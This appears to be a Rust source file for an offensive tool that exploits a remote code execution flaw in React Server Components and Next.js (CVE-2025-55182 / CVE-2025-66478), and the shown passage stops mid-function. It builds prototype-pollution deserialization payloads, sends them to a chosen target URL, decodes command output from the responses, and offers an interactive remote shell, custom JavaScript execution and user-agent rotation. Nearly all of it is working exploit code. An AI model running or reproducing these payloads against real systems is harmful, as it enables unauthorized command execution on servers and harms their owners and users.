use anyhow::{anyhow, Context, Result};
use colored::*;
use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
use regex::Regex;
use reqwest::Client;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use rand::prelude::*;
use rand::rng;

const DEFAULT_TIMEOUT_SECS: u64 = 30;
const BOUNDARY: &str = "------WebKitFormBoundaryx8jO2oVc6SWP3Sad"; // 6 dashes for body
const BOUNDARY_HEADER: &str = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"; // 4 dashes for Content-Type header

const BANNER: &str = r#"
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                      â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘
â•‘  â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘
â•‘  â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘
â•‘  â•šâ•â•      â•šâ•â•â•â•šâ•â•â• â•šâ•â•  â•šâ•â•â•â•    â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•   â•šâ•â•
â•‘                                                                      â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—                                â•‘
â•‘   â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘                               â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘                               â•‘
â•‘   â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘                               â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                          â•‘
â•‘   â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•                          â•‘
â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•CVE-2025-55182 CVE-2025-66478 <-> React-next.js RCEâ•â•â•â•â•â•â•â•â•
"#;

/// React Server Components RCE (CVE-2025-55182, CVE-2025-66478)
///
/// Advanced implementation using proper exploit chain with:
/// - Chunk reference resolution ($@0 syntax)
/// - Prototype pollution via __proto__ manipulation
/// - Function constructor gadget (_formData.get + _prefix)
/// - Multiple detection patterns for robust identification
///
/// Detects and exploits unauthenticated Remote Code Execution vulnerabilities in React Server Components
/// and Next.js through insecure deserialization in the RSC Flight protocol.
///
/// References:
/// - https://nextjs.org/blog/CVE-2025-66478
/// - https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
/// - https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/
/// - https://www.cve.org/CVERecord?id=CVE-2025-55182

#[derive(Debug, Clone)]
pub struct ExploitConfig {
    pub target: String,
    pub proxy: Option<String>,
    pub verify_ssl: bool,
    pub verbose: bool,
    pub timeout: u64,
    pub custom_headers: Vec<(String, String)>,
    pub random_agent: bool,
    pub use_color: bool,
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            proxy: None,
            verify_ssl: true,
            verbose: false,
            timeout: DEFAULT_TIMEOUT_SECS,
            custom_headers: Vec::new(),
            random_agent: false,
            use_color: true,
        }
    }
}

#[derive(Debug, Clone)]
pub struct ExploitResult {
    pub url: String,
    pub status: Option<u16>,
    pub matches: Vec<Match>,
    pub response_headers: Vec<(String, String)>,
    pub response_body: String,
    pub request_headers: Vec<(String, String)>,
    pub custom_command: Option<String>,
    pub error: Option<String>,
    pub combined_output: String,
}

#[derive(Debug, Clone)]
pub struct Match {
    pub location: String,
    pub full_line: String,
    pub matched_text: String,
    pub encoded_output: String,
    pub decoded_output: String,
    pub context: String,
}

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
];

fn print_banner() {
    println!("{}", BANNER.red().bold());
}

/// Create advanced payload using the proper CVE-2025-55182 exploit chain
/// Based on the detailed vulnerability analysis with chunk referencing and gadget chains
fn create_payload_base64(command: &str) -> String {
    // Escape special characters for JavaScript string
    let escaped_command = command
        .replace('\\', "\\\\")
        .replace('`', "\\`")
        .replace('$', "\\$")
        .replace('"', "\\\"");

    // Use the advanced payload structure from the vulnerability analysis
    // This implements the proper chunk referencing with $@0 and $B0 gadget
    format!(
        r#"{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\"then\":\"$B0\"}}","_response":{{"_prefix":"{}","__proto__":{{}},"__proto__":{{}},"constructor":{{}},"prototype":{{}},"_formData":{{"get":"$1:__proto__:constructor:constructor","__proto__":{{}},"constructor":{{}},"prototype":{{}}}},"_chunks":"$Q2","__proto__":{{}},"constructor":{{}},"prototype":{{}}}}}}"#,
        escaped_command
    )
}

/// Create alternative payload using the raw chunk reference technique ($@0)
fn create_payload_alternative(command: &str) -> String {
    // Escape special characters for JavaScript string
    let escaped_command = command
        .replace('\\', "\\\\")
        .replace('`', "\\`")
        .replace('$', "\\$")
        .replace('"', "\\\"");

    // Alternative payload using $@0 raw chunk reference technique
    format!(
        r#"{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\"then\":\"$B1337\"}}","_response":{{"_prefix":"{}","_formData":{{"get":"$1:__proto__:constructor:constructor"}}}}}}"#,
        escaped_command
    )
}

/// Decode base64 output and replace @ with newlines
fn decode_base64_output(encoded_output: &str) -> Result<String> {
    // Simple URL decode (handle %XX patterns)
    let mut decoded = String::new();
    let mut chars = encoded_output.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch == '%' {
            // Try to decode %XX pattern
            let hex1 = chars.next().and_then(|c| c.to_digit(16));
            let hex2 = chars.next().and_then(|c| c.to_digit(16));
            if let (Some(h1), Some(h2)) = (hex1, hex2) {
                let byte = (h1 * 16 + h2) as u8;
                decoded.push(byte as char);
            } else {
                decoded.push(ch);
            }
        } else {
            decoded.push(ch);
        }
    }
    
    // Replace @ with newlines (this is how we encoded it)
    let base64_string = decoded.replace('@', "\n");
    
    // Decode base64
    let decoded_bytes = BASE64_STANDARD
        .decode(&base64_string)
        .context("Failed to decode base64")?;
    
    // Try to decode as UTF-8, fallback to lossy conversion
    Ok(String::from_utf8_lossy(&decoded_bytes).to_string())
}

fn get_random_user_agent() -> &'static str {
    let mut r = rng();
    USER_AGENTS.choose(&mut r).unwrap_or(&USER_AGENTS[0])
}

fn highlight_text(text: &str, start: usize, end: usize, use_color: bool) -> String {
    let before_start = if start > 30 { start - 30 } else { 0 };
    let after_end = std::cmp::min(end + 50, text.len());
    
    let before = &text[before_start..start];
    let matched = &text[start..end];
    let after = &text[end..after_end];
    
    if use_color {
        format!("...{}{}{}", before, matched.red().bold(), after)
    } else {
        format!("...{}[{}]{}", before, matched, after)
    }
}

/// Execute a command on the target (legacy wrapper)
async fn execute_command(
    client: &Client,
    url: &str,
    command: &str,
    config: &ExploitConfig,
) -> Result<ExploitResult> {
    execute_command_with_payload(client, url, "custom_cmd", Some(command), None, config).await
}

/// Check if target is vulnerable (detection only)
async fn check_vulnerability(client: &Client, url: &str, config: &ExploitConfig) -> Result<bool> {
    // Try with whoami command first
    let result = execute_command(client, url, "whoami", config).await?;
    
    if !result.matches.is_empty() {
        return Ok(true);
    }
    
    // Try with id command as alternative
    let result = execute_command(client, url, "id", config).await?;
    
    Ok(!result.matches.is_empty())
}

fn print_results(result: &ExploitResult, config: &ExploitConfig) {
    if let Some(error) = &result.error {
        if config.use_color {
            println!("{}", format!("\nâŒ Error checking {}: {}", result.url, error).red());
        } else {
            println!("\nâŒ Error checking {}: {}", result.url, error);
        }
        return;
    }

    println!("\n{}", "=".repeat(80));
    
    if config.use_color {
        println!("{}", format!("TARGET: {}", result.url).cyan().bold());
        if let Some(status) = result.status {
            println!("{}", format!("STATUS CODE: {}", status).yellow());
        }
    } else {
        println!("TARGET: {}", result.url);
        if let Some(status) = result.status {
            println!("STATUS CODE: {}", status);
        }
    }
    
    println!("{}", "=".repeat(80));

    if config.verbose {
        println!("\n{}", "REQUEST DETAILS".bold());
        println!("{}", "-".repeat(40));
        for (key, value) in &result.request_headers {
            if value.len() > 100 {
                println!("  {}: {}...", key, &value[..100]);
            } else {
                println!("  {}: {}", key, value);
            }
        }
    }

    if !result.matches.is_empty() {
        let alternative_used = result.matches.iter()
            .any(|m| m.location.contains("Alternative Payload"));

        if config.use_color {
            if alternative_used {
                println!("{}", "\nâš ï¸  ALTERNATIVE PAYLOAD SUCCESSFUL (id command executed)".yellow().bold());
            } else {
                println!("{}", "\nğŸ©¸ EXPLOITATION SUCCESSFUL".green().bold());
            }
        } else {
            if alternative_used {
                println!("\nâš ï¸  ALTERNATIVE PAYLOAD SUCCESSFUL (id command executed)");
            } else {
                println!("\nğŸ©¸ EXPLOITATION SUCCESSFUL");
            }
        }

        println!("{}", "=".repeat(80));
        println!("\n{}", "FOUND MATCHES:".bold());
        println!("{}", "-".repeat(80));

        for (i, m) in result.matches.iter().enumerate() {
            println!("\n[{}] LOCATION: {}", i + 1, m.location);
            println!("    MATCHED TEXT: {}", m.matched_text);
            if config.verbose {
                println!("    FULL LINE: {}", m.full_line);
            }
            println!("    ENCODED: {}...", 
                if m.encoded_output.len() > 50 { &m.encoded_output[..50] } else { &m.encoded_output });
            println!("    CONTEXT: {}...", 
                if m.context.len() > 80 { &m.context[..80] } else { &m.context });
        }

        println!("\n{}", "=".repeat(80));
        
        if config.use_color {
            if alternative_used {
                println!("{}", "COMMAND OUTPUT DECODED (id command):".magenta().bold());
            } else if let Some(cmd) = &result.custom_command {
                println!("{}", format!("COMMAND OUTPUT DECODED (from: {}): ", cmd).magenta().bold());
            } else {
                println!("{}", "DECODED COMMAND OUTPUTS:".magenta().bold());
            }
        } else {
            println!("DECODED COMMAND OUTPUTS:");
        }
        
        println!("{}", "-".repeat(80));

        for (i, m) in result.matches.iter().enumerate() {
            if config.use_color {
                println!("\n{}", format!("[OUTPUT {}]", i + 1).yellow());
                println!("{}", "-".repeat(60).cyan());
                println!("{}", "Base64 Encoded (from server):".blue());
            } else {
                println!("\n[OUTPUT {}]", i + 1);
                println!("{}", "-".repeat(60));
                println!("Base64 Encoded (from server):");
            }
            
            if m.encoded_output.len() > 100 {
                println!("{}...", &m.encoded_output[..100]);
            } else {
                println!("{}", m.encoded_output);
            }

            if config.use_color {
                println!("\n{}", "Decoded Output:".green());
            } else {
                println!("\nDecoded Output:");
            }
            println!("{}", m.decoded_output);
            
            if config.use_color {
                println!("{}", "-".repeat(60).cyan());
            } else {
                println!("{}", "-".repeat(60));
            }
        }
    } else {
        if config.use_color {
            println!("{}", "\nâŒ No 'login?a=' pattern found in response".red());
        } else {
            println!("\nâŒ No 'login?a=' pattern found in response");
        }
    }

    if config.verbose {
        println!("\n{}", "RESPONSE DETAILS".bold());
        println!("{}", "=".repeat(80));
        
        if !result.combined_output.is_empty() {
            println!("\n{}", "COMBINED COMMAND OUTPUT:".bold());
            println!("{}", "-".repeat(40));
            println!("{}", result.combined_output);
        }
        
        println!("\nRESPONSE HEADERS:");
        println!("{}", "-".repeat(40));
        for (key, value) in &result.response_headers {
            println!("  {}: {}", key, value);
        }
        
        println!("\nRESPONSE BODY ({} characters):", result.response_body.len());
        println!("{}", "-".repeat(40));
        if result.response_body.len() > 1500 {
            println!("{}", &result.response_body[..1500]);
            println!("\n... [Body truncated] ...");
        } else {
            println!("{}", result.response_body);
        }
    }
}

/// Interactive shell mode
async fn interactive_shell(client: &Client, url: &str, config: &ExploitConfig) -> Result<()> {
    println!("{}", "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—".cyan());
    println!("{}", "â•‘   INTERACTIVE SHELL MODE                                 â•‘".cyan());
    println!("{}", "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•".cyan());
    println!();
    println!("{}", "[*] Testing connection...".yellow());
    
    // Test with whoami
    let whoami_result = execute_command(client, url, "whoami", config).await?;
    if whoami_result.matches.is_empty() {
        return Err(anyhow!("Connection test failed. Target may not be vulnerable or may have been patched."));
    }
    
    let username = whoami_result.matches[0].decoded_output.trim();
    
    // Get current directory
    let pwd_result = execute_command(client, url, "pwd", config).await?;
    let mut current_dir = if !pwd_result.matches.is_empty() {
        pwd_result.matches[0].decoded_output.trim().to_string()
    } else {
        "/".to_string()
    };
    
    println!("{}", format!("[+] Connected! User: {}, Directory: {}", username, current_dir).green().bold());
    println!("{}", "[*] Type 'help' for available commands, 'exit' to quit".cyan());
    println!();
    
    let parsed_url = reqwest::Url::parse(url)?;
    let hostname = parsed_url.host_str().unwrap_or("target");
    
    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin);
    let mut line = String::new();
    
    loop {
        print!("{}", format!("[{}@{}:{}]$ ", username, hostname, current_dir).green().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        
        line.clear();
        if reader.read_line(&mut line).await.is_err() {
            break;
        }
        
        let cmd = line.trim();
        
        if cmd.is_empty() {
            continue;
        }
        
        match cmd {
            "exit" | "quit" => {
                println!("{}", "[*] Exiting shell...".yellow());
                break;
            }
            "help" => {
                println!("\nAvailable commands:");
                println!("  help              Show this help");
                println!("  exit, quit        Exit the shell");
                println!("  clear             Clear the screen");
                println!("  whoami            Show current user");
                println!("  pwd               Show current directory");
                println!("  cd <dir>          Change directory");
                println!("  history           Show command history");
                println!("  <command>         Execute system command\n");
            }
            "clear" => {
                print!("\x1B[2J\x1B[1;1H");
                tokio::io::stdout()
                    .flush()
                    .await
                    .context("Failed to flush stdout")?;
            }
            "whoami" => {
                println!("{}", username);
            }
            "pwd" => {
                println!("{}", current_dir);
            }
            cmd if cmd.starts_with("cd ") => {
                let target_dir = cmd[3..].trim();
                let cd_cmd = if target_dir.is_empty() {
                    "cd ~ && pwd".to_string()
                } else {
                    format!("cd {} && pwd", target_dir)
                };
                
                match execute_command(client, url, &cd_cmd, config).await {
                    Ok(result) if !result.matches.is_empty() => {
                        let new_dir = result.matches[0].decoded_output.trim();
                        if !new_dir.contains("No such file") && !new_dir.contains("not a directory") {
                            current_dir = new_dir.to_string();
                            println!("{}", format!("Changed directory to: {}", current_dir).green());
                        } else {
                            println!("{}", format!("cd: {}: No such file or directory", target_dir).red());
                        }
                    }
                    _ => {
                        println!("{}", format!("cd: {}: Failed to change directory", target_dir).red());
                    }
                }
            }
            _ => {
                match execute_command(client, url, cmd, config).await {
                    Ok(result) => {
                        if !result.combined_output.is_empty() {
                            print!("{}", result.combined_output);
                        } else if result.matches.is_empty() {
                            println!("{}", "[!] Command executed but no output received".yellow());
                        } else {
                            for m in &result.matches {
                                print!("{}", m.decoded_output);
                            }
                        }
                    }
                    Err(e) => {
                        println!("{}", format!("[-] Error: {}", e).red());
                    }
                }
            }
        }
    }
    
    Ok(())
}

/// Prompt helper functions
async fn prompt(message: &str) -> Result<String> {
    print!("{}", format!("{}: ", message).cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    Ok(input.trim().to_string())
}

async fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", message, default).cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut input)
        .await
        .context("Failed to read input")?;
    let trimmed = input.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

async fn prompt_yes_no(message: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", message, default_char).cyan().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        let mut input = String::new();
        tokio::io::BufReader::new(tokio::io::stdin())
            .read_line(&mut input)
            .await
            .context("Failed to read input")?;
        let trimmed = input.trim().to_lowercase();
        if trimmed.is_empty() {
            return Ok(default_yes);
        } else if trimmed == "y" || trimmed == "yes" {
            return Ok(true);
        } else if trimmed == "n" || trimmed == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

/// Create custom payload from user-provided JavaScript code using advanced technique
fn create_custom_payload(js_code: &str) -> String {
    // Escape special characters for JavaScript string
    let escaped_code = js_code
        .replace('\\', "\\\\")
        .replace('`', "\\`")
        .replace('$', "\\$")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r");

    // Use the advanced payload structure for custom JS code
    format!(
        r#"{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\"then\":\"$B0\"}}","_response":{{"_prefix":"{}","__proto__":{{}},"__proto__":{{}},"constructor":{{}},"prototype":{{}},"_formData":{{"get":"$1:__proto__:constructor:constructor","__proto__":{{}},"constructor":{{}},"prototype":{{}}}},"_chunks":"$Q2","__proto__":{{}},"constructor":{{}},"prototype":{{}}}}}}"#,
        escaped_code
    )
}

/// Execute command with custom payload option
async fn execute_command_with_payload(
    client: &Client,
    url: &str,
    payload_type: &str,
    custom_command: Option<&str>,
    custom_js: Option<&str>,
    config: &ExploitConfig,
) -> Result<ExploitResult> {
    let payload_json = match payload_type {
        "custom_js" => {
            if let Some(js) = custom_js {
                create_custom_payload(js)
            } else {
                return Err(anyhow!("Custom JavaScript code required for custom_js payload type"));
            }
        }
        "custom_cmd" => {
            if let Some(cmd) = custom_command {
                create_payload_base64(cmd)
            } else {
                return Err(anyhow!("Command required for custom_cmd payload type"));
            }
        }
        "whoami" => create_payload_base64("whoami"),
        "id" => create_payload_base64("id"),
        "pwd" => create_payload_base64("pwd"),
        "uname" => create_payload_base64("uname -a"),
        "ls" => create_payload_base64("ls -la"),
        "ps" => create_payload_base64("ps aux"),
        _ => create_payload_base64(payload_type),
    };

    // Create the chunk reference payload format using $@0 syntax
    let chunk_ref_payload = format!(r#""$@0""#);

    let body = format!(
        "{}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{}\r\n{}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{}\r\n{}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n{}--",
        BOUNDARY, payload_json, BOUNDARY, chunk_ref_payload, BOUNDARY, BOUNDARY
    );

    let parsed_url = reqwest::Url::parse(url)?;
    let host = parsed_url.host_str()
        .map(|h| {
            if let Some(port) = parsed_url.port() {
                format!("{}:{}", h, port)
            } else {
                h.to_string()
            }
        })
        .unwrap_or_else(|| "localhost".to_string());

    // No longer need to create body here since it's now created above with chunk_ref_payload

    let user_agent = if config.random_agent {
        get_random_user_agent()
    } else {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
    };

    let mut request = client.post(url)
        .header("Host", &host)
        .header("Content-Type", format!("multipart/form-data; boundary={}", BOUNDARY_HEADER))
        .header("Next-Action", "x")
        .header("Sec-Ch-Ua-Platform", "macOS")
        .header("User-Agent", user_agent)
        .header("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")
        .header("X-Nextjs-Request-Id", "b5dce965")
        .header("Upgrade-Insecure-Requests", "1")
        .header("Accept-Language", "en-US,en;q=0.9")
        .header("Sec-Ch-Ua-Mobile", "?0");

    // Add custom headers
    for (key, value) in &config.custom_headers {
        request = request.header(key, value);
    }

    let mut request_headers = vec![
        ("Host".to_string(), host.clone()),
        ("Content-Type".to_string(), format!("multipart/form-data; boundary={}", BOUNDARY_HEADER)),
        ("User-Agent".to_string(), user_agent.to_string()),
    ];
    request_headers.extend(config.custom_headers.clone());

    let response = request
        .body(body)
        .send()
        .await
        .context("Failed to send exploit request")?;

    let status = response.status().as_u16();
    
    // Get headers before consuming response
    let mut header_values = Vec::new();
    let mut response_headers = Vec::new();
    for (name, value) in response.headers() {
        if let Ok(header_str) = value.to_str() {
            header_values.push(header_str.to_string());
            response_headers.push((name.to_string(), header_str.to_string()));
        }
    }

    let response_text = response.text().await.context("Failed to read response")?;

    // Multiple patterns to detect the vulnerability (more comprehensive detection)
    // Primary pattern: login?a= with base64 output
    let login_pattern = Regex::new("login\\?a=([^&\\s'<>]+)")?;

    // Alternative patterns for different response formats
    let error_patterns = vec![
        Regex::new("NEXT_REDIRECT[^;]*;push;([^;]+);")?,  // NEXT_REDIRECT pattern
        Regex::new("digest:\\s*`([^`]+)`")?,              // Digest pattern
        Regex::new("Error:\\s*([^<\\n]+)")?,             // Error message pattern
        Regex::new("digest.*`([^`]+)`")?,                // Simplified throw pattern
    ];
    
    let mut matches = Vec::new();
    
    // Check response body with multiple patterns
    for (line_num, line) in response_text.lines().enumerate() {
        // Check primary login?a= pattern
        for cap in login_pattern.captures_iter(line) {
            if let Some(encoded) = cap.get(1) {
                let encoded_str = encoded.as_str();
                match decode_base64_output(encoded_str) {
                    Ok(decoded) => {
                        if let Some(full_match) = cap.get(0) {
                            let match_start = full_match.start();
                            let match_end = full_match.end();

                            matches.push(Match {
                                location: format!("Body Line {} (login?a=)", line_num + 1),
                                full_line: if line.len() > 200 {
                                    format!("{}...", &line[..200])
                                } else {
                                    line.to_string()
                                },
                                matched_text: full_match.as_str().to_string(),
                            encoded_output: encoded_str.to_string(),
                            decoded_output: decoded.clone(),
                                context: highlight_text(line, match_start, match_end, config.use_color),
                            });
                        }
                    }
                    Err(e) => {
                        if config.verbose {
                            eprintln!("{}", format!("[!] Base64 decoding error: {}", e).yellow());
                        }
                    }
                }
            }
        }

        // Check alternative error patterns
        for (pattern_idx, pattern) in error_patterns.iter().enumerate() {
            for cap in pattern.captures_iter(line) {
                if let Some(encoded) = cap.get(1) {
                    let encoded_str = encoded.as_str();
                    // Try to decode as base64, fallback to direct use
                    let decoded = match decode_base64_output(encoded_str) {
                        Ok(d) => d,
                        Err(_) => {
                            // For error patterns, sometimes the content is already decoded
                            if encoded_str.contains('\n') || encoded_str.len() > 50 {
                                encoded_str.to_string()
                            } else {
                                continue; // Skip if it doesn't look like valid output
                            }
                        }
                    };

                    if let Some(full_match) = cap.get(0) {
                        let match_start = full_match.start();
                        let match_end = full_match.end();

                        matches.push(Match {
                            location: format!("Body Line {} (Pattern {})", line_num + 1, pattern_idx + 1),
                            full_line: if line.len() > 200 {
                                format!("{}...", &line[..200])
                            } else {
                                line.to_string()
                            },
                            matched_text: full_match.as_str().to_string(),
                            encoded_output: encoded_str.to_string(),
                            decoded_output: decoded,
                            context: highlight_text(line, match_start, match_end, config.use_color),
                        });
                    }
                }
            }
        }
    }
    
    // Check response headers with multiple patterns
    for (header_name, header_str) in &response_headers {
        // Check primary login?a= pattern in headers
        for cap in login_pattern.captures_iter(header_str) {
            if let Some(encoded) = cap.get(1) {
                let encoded_str = encoded.as_str();
                match decode_base64_output(encoded_str) {
                    Ok(decoded) => {
                        if let Some(full_match) = cap.get(0) {
                            let match_start = full_match.start();
                            let match_end = full_match.end();

                            matches.push(Match {
                                location: format!("Header: {} (login?a=)", header_name),
                                full_line: header_str.clone(),
                                matched_text: full_match.as_str().to_string(),
                            encoded_output: encoded_str.to_string(),
                            decoded_output: decoded.clone(),
                                context: highlight_text(header_str, match_start, match_end, config.use_color),
                            });
                        }
                    }
                    Err(e) => {
                        if config.verbose {
                            eprintln!("{}", format!("[!] Base64 decoding error: {}", e).yellow());
                        }
                    }
                }
            }
        }

        // Check alternative error patterns in headers
        for (pattern_idx, pattern) in error_patterns.iter().enumerate() {
            for cap in pattern.captures_iter(header_str) {
                if let Some(encoded) = cap.get(1) {
                    let encoded_str = encoded.as_str();
                    let decoded = match decode_base64_output(encoded_str) {
                        Ok(d) => d,
                        Err(_) => {
                            if encoded_str.contains('\n') || encoded_str.len() > 50 {
                                encoded_str.to_string()
                            } else {
                                continue;
                            }
                        }
                    };

                    if let Some(full_match) = cap.get(0) {
                        let match_start = full_match.start();
                        let match_end = full_match.end();

                        matches.push(Match {
                            location: format!("Header: {} (Pattern {})", header_name, pattern_idx + 1),
                            full_line: header_str.clone(),
                            matched_text: full_match.as_str().to_string(),
                            encoded_output: encoded_str.to_string(),
                            decoded_output: decoded,
                            context: highlight_text(header_str, match_start, match_end, config.use_color),
                        });
                    }
                }
            }
        }
    }

    // If no matches found, try alternative payload with id command using different technique
    if matches.is_empty() && payload_type != "id" {
        if config.verbose {
            println!("{}", "  No 'login?a=' pattern found, trying alternative payload with raw chunk reference...".yellow());
        }

        let alt_payload = create_payload_alternative("id");
